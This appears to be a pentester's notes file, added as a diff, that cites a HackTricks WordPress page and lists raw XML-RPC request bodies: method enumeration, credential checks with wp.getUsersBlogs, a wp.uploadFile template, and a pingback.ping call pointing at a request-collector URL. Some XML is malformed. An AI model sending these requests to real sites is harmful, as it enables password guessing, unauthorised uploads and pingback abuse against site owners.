@@ -1,0 +1,128 @@
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress
+
+<methodCall>
+<methodName>system.listMethods</methodName>
+<params></params>
+</methodCall>
+
+<methodCall>
+<methodName>wp.getUsersBlogs</methodName>
+<params>
+<param><value>admin</value></param>
+<param><value>pass</value></param>
+</params>
+</methodCall>
+
+
+
+<?xml version='1.0' encoding='utf-8'?>
+<methodCall>
+<methodName>wp.uploadFile</methodName>
+<params>
+<param>
+<value><string>1</string></value></param>
+<param>
+<value><string>username</string></value>
+</param>
+
+<param>
+<value><string>password</string></value></param>
+		<param>
+			<value>
+				<struct>
+					<member>
+						<name>name</name>
+						<value><string>filename.jpg</string></value>
+					</member>
+					<member>
+						<name>type</name>
+						<value><string>mime/type</string></value>
+					</member>
+					<member>
+						<name>bits</name>
+						<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
+					</member>
+				</struct>
+			</value>
+		</param>
+	</params>
+</methodCall>
+                                                   
+
+
+__________________________________________________________________________________________________________________________________________________________________________________________________________________
+<?xml version="1.0" encoding="utf-8"?>
+<methodCall>
+<methodName>system.listMethods</methodName>
+<params></params>
+</methodCall>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params>
+<param>
+<value><string>https://postb.in/1562017983221-4377199190203</string</value>
+</param>
+<param>
+<value><string>https://example.com/</string></value>
+</param>
+</params>
+</methodCall>
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<methodCall>
+<methodName>wp.getUsersBlogs</methodName>
+<params>
+<param><value>\{\{your username\}\}</velue></param>
+<param><value>\{\[your password\}\}</value></param>
+</params>
+</methodCall>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
